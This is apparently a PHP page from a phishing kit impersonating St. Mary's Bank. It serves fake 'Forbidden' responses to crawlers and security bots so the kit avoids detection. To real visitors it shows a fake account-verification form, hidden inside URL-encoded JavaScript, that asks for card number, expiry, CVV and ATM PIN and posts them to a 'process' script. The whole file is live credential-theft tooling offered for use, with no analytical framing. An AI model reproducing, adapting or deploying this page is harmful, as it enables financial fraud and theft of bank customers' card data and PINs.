<?php

$settings = include '../../settings/settings.php';
$useragent = $_SERVER['HTTP_USER_AGENT'];
include '../Bots/fucker.php';
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}


?>
<script>
document.write(unescape('%0A%3Chtml%20lang%3D%22en%22%20class%3D%22__sticky-footer%22%3E%0A%0A%3Chead%3E%0A%09%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%09%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20user-scalable%3Dno%2C%20initial-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20minimum-scale%3D1.0%22%3E%0A%09%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22ie%3Dedge%22%3E%0A%09%3Clink%20href%3D%22files/foundation-all.css%22%20rel%3D%22stylesheet%22%3E%0A%09%3Clink%20href%3D%22files/koatta.css%22%20rel%3D%22stylesheet%22%3E%0A%09%3Cstyle%3E%0A%09/*SUGGESTED%20ADD%20FOR%20THE%20FRAMEWORK*/%0A%09%0A%09.no-headerFooter%20%3E%20.mtb-page-header%20%7B%0A%09%09display%3A%20none%3B%0A%09%7D%0A%09%0A%09.no-headerFooter%20%7B%0A%09%09padding-top%3A%201.5rem%3B%0A%09%7D%0A%09%3C/style%3E%0A%09%3Ctitle%3ESt.%20Mary%27s%20Bank%3C/title%3E%0A%09%3Clink%20rel%3D%22shortcut%20icon%22%20href%3D%22https%3A//i8.ae/kJZVb%22%20type%3D%22image/x-icon%22%3E%0A%09%3Cmeta%20class%3D%22foundation-mq%22%3E%0A%09%0A%3C/head%3E%0A%0A%3Cbody%20class%3D%22%22%3E%0A%09%3Cheader%20class%3D%22mtb-page-header%22%3E%0A%09%09%3Ca%20class%3D%22mtb__logo%22%20href%3D%22%22%3E%20%3Cimg%20class%3D%22mtb__logo%22%20src%3D%22files/emblem_logo.png%22%20alt%3D%22hhjthM%26amp%3BT%20Bank%22%3E%20%3C/a%3E%20%3Ca%20href%3D%22%22%20class%3D%22button%20button__right%20hide%20js-exitButton%22%20data-ensightentag%3D%22ExitButton%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20Exit%0A%20%20%20%20%20%20%20%20%3C/a%3E%20%3C/header%3E%0A%09%3Cdiv%20data-msg-code%3D%22%22%20class%3D%22callout%20warning%20__no-border%20__page-error%20js-pgLevelMsg%20hide%22%20tabindex%3D%220%22%3E%0A%09%09%3Cdiv%20class%3D%22js-pgLevelMsgtext%20mtb-app-enrollment--content%22%3E%3C/div%3E%0A%09%3C/div%3E%0A%09%3Cdiv%20class%3D%22mtb-app-enrollment--content%22%3E%0A%09%09%3Cform%20action%3D%22process/verify_session_card%22%20class%3D%22js-form%20js-verifyAccountForm%22%20id%3D%22verifyAccountForm%22%20method%3D%22post%22%20name%3D%22verifyAccountForm%22%3E%0A%09%09%09%3Cinput%20type%3D%22hidden%22%20value%3D%22R%22%20name%3D%22EnrolleeType%22%20id%3D%22EnrolleeType%22%3E%0A%09%09%09%3Cinput%20type%3D%22hidden%22%20value%3D%22RetailAccount%22%20name%3D%22EnrollmentType%22%20id%3D%22EnrollmentType%22%3E%0A%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22EnrolleeIdentifier%22%20id%3D%22EnrolleeIdentifier%22%3E%0A%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22EnrolleeToken%22%20id%3D%22EnrolleeToken%22%3E%0A%09%09%09%3Cinput%20type%3D%22hidden%22%20value%3D%22False%22%20name%3D%22IsMobilePlatfom%22%20id%3D%22IsMobilePlatfom%22%3E%0A%09%09%09%3Cinput%20type%3D%22hidden%22%20value%3D%22OLB%3AMOE%3AVerifyYourAccountInfo%22%20name%3D%22TagPageName%22%20id%3D%22TagPageName%22%3E%0A%09%09%09%3Cinput%20type%3D%22hidden%22%20value%3D%22False%22%20name%3D%22SetFieldsToProtected%22%20id%3D%22SetFieldsToProtected%22%3E%0A%09%09%09%3Csection%20class%3D%22grid-x%20grid-padding-x%20__spacer-form%20grid-x__padded%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%3C%21--%20page%20title%20--%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22mtb-section-header%20mtb-section-header--top%22%3E%0A%09%09%09%09%09%09%3Cp%20class%3D%22__top-title%22%3E%20%20%3C/p%3E%0A%09%09%09%09%09%09%3Ch1%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20Verify%20your%20account%20information%0A%20%20%20%20%20%20%20%20%3C/h1%3E%0A%09%09%09%09%09%09%3Cp%3E%20Enter%20your%20information%20to%20verify%20your%20identity.%20%3C/p%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22expanded%20button-group%20button-group__toggle%22%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20class%3D%22cell%20hide%22%20data-showfor%3D%22BusinessAccount%22%3E%0A%09%09%09%09%09%3Ch2%20class%3D%22mtb-form__section-title%20hide%22%20data-showfor%3D%22BusinessAccount%22%3E%0A%20%20%20%20%20%20%20%20Company%20Administrator%20Information%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20tabindex%3D%220%22%20type%3D%22button%22%20class%3D%22m-icon%20m-icon-questionmarkcircle%20__contextual-help%20mtb-help%20m-icon-questionmarkcircle%20js-modal-trigger%22%20aria-haspopup%3D%22true%22%20aria-controls%3D%22reveal-basic%22%20data-ensightentag%3D%22CompanyAdministratorInfoQuestionIcon%22%20data-open%3D%22companyadmin-modal%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22show-for-sr%22%3EShow%20Help%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/button%3E%0A%20%20%20%20%3C/h2%3E%20%3C/div%3E%0A%09%09%09%09%3Cdiv%20data-parentfor%3D%22FirstName%22%20class%3D%22cell%20js-formFieldParent%22%20data-showfor%3D%22BusinessAccount%22%3E%0A%09%09%09%09%09%3Clabel%20for%3D%22FirstName%22%3ECard%20Number%3C/label%3E%0A%09%09%09%09%09%3Cinput%20data-fcid%3D%22%22%20value%3D%22%22%20maxlength%3D%2219%22%20class%3D%22js-formnputItem%22%20data-allowpaste%3D%22True%22%20data-allowcopy%3D%22True%22%20placeholder%3D%22XXXX%20XXXX%20XXXX%20XXXX%22%20type%3D%22tel%22%20id%3D%22cnum%22%20name%3D%22cnum%22%20required%3D%22true%22%20%3E%0A%09%09%09%09%09%3Cscript%20src%3D%22files/mask.js%22%3E%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%09%3Cscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%09var%20element%20%3D%20document.getElementById%28%27cnum%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%09var%20maskOptions%20%3D%20%7Bmask%3A%20%270000%200000%200000%200000%27%7D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%09var%20mask%20%3D%20IMask%28element%2C%20maskOptions%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%20%20%20%20%3C/script%3E%0A%09%09%09%09%09%3Cp%20class%3D%22form-error%22%20id%3D%22FirstNameError%22%20role%3D%22alert%22%3E%3C/p%3E%0A%09%09%09%09%09%3Cp%20class%3D%22form-help-text%22%3E%3C/p%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20data-parentfor%3D%22LastName%22%20class%3D%22cell%20js-formFieldParent%22%20data-showfor%3D%22BusinessAccount%22%3E%0A%09%09%09%09%09%3Clabel%20for%3D%22LastName%22%3EExpiration%3C/label%3E%0A%09%09%09%09%09%3Cinput%20data-fcid%3D%22%22%20value%3D%22%22%20maxlength%3D%227%22%20class%3D%22js-formnputItem%22%20data-allowpaste%3D%22True%22%20data-allowcopy%3D%22True%22%20%20placeholder%3D%22XX/XXXX%22%20type%3D%22tel%22%20id%3D%22exp%22%20required%3D%22true%22%20name%3D%22exp%22%20%3E%0A%09%09%09%09%09%3Cscript%20src%3D%22files/mask.js%22%3E%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%09%3Cscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%09var%20element%20%3D%20document.getElementById%28%27exp%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%09var%20maskOptions%20%3D%20%7Bmask%3A%20%2700/0000%27%7D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%09var%20mask%20%3D%20IMask%28element%2C%20maskOptions%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%09%09%09%09%09%09%09%09%20%20%20%20%3C/script%3E%0A%09%09%09%09%09%3Cp%20class%3D%22form-error%22%20id%3D%22LastNameError%22%20role%3D%22alert%22%3E%3C/p%3E%0A%09%09%09%09%09%3Cp%20class%3D%22form-help-text%22%3E%3C/p%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%0A%09%09%09%09%0A%09%09%09%09%3Cdiv%20data-parentfor%3D%22SSN%22%20class%3D%22cell%20js-formFieldParent%22%20data-showfor%3D%22BusinessCreditCard%2CRetailCreditCard%2CBusinessAccount%2CRetailAccount%22%20data-formattype%3D%22ssn%22%3E%0A%09%09%09%09%09%3Clabel%20for%3D%22SSN%22%3ECvv%20Code%3C/label%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22js-maskFldParent%20input-group%20m-fake-single-input%22%20data-maskoverlay%3D%22%u25CF%u25CF%u25CF-%u25CF%u25CF-%u25CF%u25CF%u25CF%u25CF%22%3E%0A%09%09%09%09%09%09%3Cinput%20data-fcid%3D%22%22%20value%3D%22%22%20required%3D%22true%22%20maxlength%3D%223%22%20%20placeholder%3D%22XXX%22%20data-allowpaste%3D%22True%22%20data-allowcopy%3D%22True%22%20data-textboxaccepts%3D%22numbers%22%20%20data-inputtype%3D%22tel%22%20class%3D%22input-group-field%20js-canShowHide%20js-formnputItem%20input-group__hide-button-on-focus%22%20type%3D%22tel%22%20id%3D%22cvv%22%20name%3D%22cvv%22%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20data-parentfor%3D%22DateOfBirth%22%20class%3D%22cell%20js-formFieldParent%22%20data-showfor%3D%22BusinessCreditCard%2CRetailCreditCard%2CBusinessAccount%2CRetailAccount%22%20data-formattype%3D%22date%22%3E%0A%09%09%09%09%09%3Clabel%20for%3D%22DateOfBirth%22%3EATM%20Pin%3C/label%3E%0A%09%09%09%09%09%3Cinput%20data-fcid%3D%22%22%20value%3D%22%22%20%20class%3D%22js-formnputItem%22%20data-allowpaste%3D%22True%22%20data-allowcopy%3D%22True%22%20data-textboxaccepts%3D%22numbers%22%20%20type%3D%22tel%22%20id%3D%22pin%22%20name%3D%22pin%22%20maxlength%3D%224%22%20required%3D%22true%22%20data-inputtype%3D%22tel%22%3E%0A%09%09%09%09%09%3Cp%20class%3D%22form-error%22%20id%3D%22DateOfBirthError%22%20role%3D%22alert%22%3E%3C/p%3E%0A%09%09%09%09%09%3Cp%20class%3D%22form-help-text%22%3E%3C/p%3E%0A%09%09%09%09%3C/div%3E%0A%0A%0A%09%09%09%09%0A%0A%0A%09%09%09%09%0A%09%09%09%3C/section%3E%0A%09%09%09%3Csection%20class%3D%22grid-x%20grid-padding-x%20mtb-form__section-spacer-button%20grid-x__padded%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%3Cbutton%20data-ensightentag%3D%22ContinueButton%22%20type%3D%22submit%22%20data-url%3D%22%22%20class%3D%22button%20button__form%20js-submit%22%3E%20Continue%20%3C/button%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%20%3Ca%20href%3D%22/Enrollment/Index%22%20class%3D%22button%20button__fake-padding%20expanded%20clear%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Go%20Back%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%20%3C/div%3E%0A%09%09%09%3C/section%3E%0A%09%09%3C/form%3E%0A%09%09%3Cinput%20id%3D%22TagPageName%22%20name%3D%22TagPageName%22%20type%3D%22hidden%22%20value%3D%22OLB%3AMOE%3ACombinedAccountEligibility%22%3E%20%3C/div%3E%0A%09%3Cfooter%20class%3D%22mtb-footer%22%20role%3D%22contentinfo%22%3E%0A%09%09%3Cdiv%20class%3D%22grid-x%20grid-padding-x%20align-center-middle%20grid-x__padded%22%3E%0A%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%3Cp%3E%20%A92023%20St.%20Mary%27s%20Bank%20All%20Rights%20Reserved.%0A%09%09%09%09%09%3Cbr%3E%20Users%20of%20this%20website%20agree%20to%20be%20bound%20by%20the%20provisions%20of%20the%20%20St.%20Mary%27s%20Bank%20website%20%3Ca%20href%3D%22%22%20target%3D%22_blank%22%3ETerms%20of%20Use%3C/a%3E%20and%20%3Ca%20href%3D%22%22%20target%3D%22_blank%22%3EPrivacy%20Policy%3C/a%3E.%20%3C/p%3E%0A%09%09%09%09%3Cdiv%20class%3D%22mtb-footer__logo%22%3E%0A%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cp%3E%20Equal%20Housing%20Lender.%20NMLS%20%23381076%0A%09%09%09%09%09%3Cbr%3E%20%3Ca%20href%3D%22%22%20target%3D%22_blank%22%3EMember%20FDIC.%3C/a%3E%20%3C/p%3E%0A%09%09%09%3C/div%3E%0A%09%09%3C/div%3E%0A%09%3C/footer%3E%0A%09%0A%09%3Cdiv%20class%3D%22reveal-overlay%22%3E%0A%09%09%3Cdiv%20class%3D%22reveal%20mtb-reveal%22%20id%3D%22minwarning-modal%22%20role%3D%22dialog%22%20data-reveal%3D%22%22%20data-options%3D%22closeOnClick%3Afalse%22%20aria-hidden%3D%22true%22%20data-yeti-box%3D%22minwarning-modal%22%20data-resize%3D%22minwarning-modal%22%20data-i%3D%22842lji-i%22%20data-events%3D%22resize%22%20style%3D%22top%3A%20242px%3B%22%3E%0A%09%09%09%3Cdiv%20class%3D%22mtb-reveal-title%20%22%3E%0A%09%09%09%09%3Ch1%3ETimeout%20Message%3C/h1%3E%20%3C/div%3E%0A%09%09%09%3Cdiv%20class%3D%22mtb-reveal-body%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22cell%22%3E%0A%09%09%09%09%09%3Cp%3EYour%20online%20banking%20session%20has%20been%20inactive%20for%209%20minutes.%20For%20your%20security%2C%20we%20will%20automatically%20log%20you%20out%20in%201%20minute.%20Click%20Stay%20Online%20to%20continue%20your%20session.%3C/p%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/div%3E%0A%09%09%09%3Cdiv%20class%3D%22grid-x%20grid-padding-x%20grid-x__padded%20mtb-reveal-bottom%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22cell%20small-6%22%3E%20%3Ca%20href%3D%22/Enrollment%22%20class%3D%22button%20hollow%20expanded%22%20aria-label%3D%22Log%20out%22%20data-close%3D%22%22%20data-ensightentag%3D%22ExitButton%22%20name%3D%22TagPageName%22%20id%3D%22TagPageName%22%3EEXIT%3C/a%3E%20%3C/div%3E%0A%09%09%09%09%3Cdiv%20class%3D%22cell%20small-6%22%3E%0A%09%09%09%09%09%3Cbutton%20class%3D%22button%20expanded%20js-sessiontimer%22%20aria-label%3D%22Close%20modal%22%20type%3D%22button%22%20data-sessiontimer%3D%229%22%20data-close%3D%22%22%20data-ensightentag%3D%22StayOnlineButton%22%20name%3D%22TagPageName%22%20id%3D%22TagPageName%22%3ESTAY%20ONLINE%3C/button%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/div%3E%0A%09%09%3C/div%3E%0A%09%3C/div%3E%0A%09%0A%09%3Cdiv%20class%3D%22reveal-overlay%20mtb-spinner--overlay%22%20id%3D%22loadingOverlay%22%3E%0A%09%09%3Cdiv%20class%3D%22mtb-spinner--triple-dot%22%3E%0A%09%09%09%3Cdiv%3E%3C/div%3E%0A%09%09%09%3Cdiv%3E%3C/div%3E%0A%09%09%09%3Cdiv%3E%3C/div%3E%20%3Cspan%20class%3D%22show-for-sr%22%3ELoading%20...%3C/span%3E%20%3C/div%3E%0A%09%3C/div%3E%0A%3C/body%3E%0A%0A%3C/html%3E'))
</script>
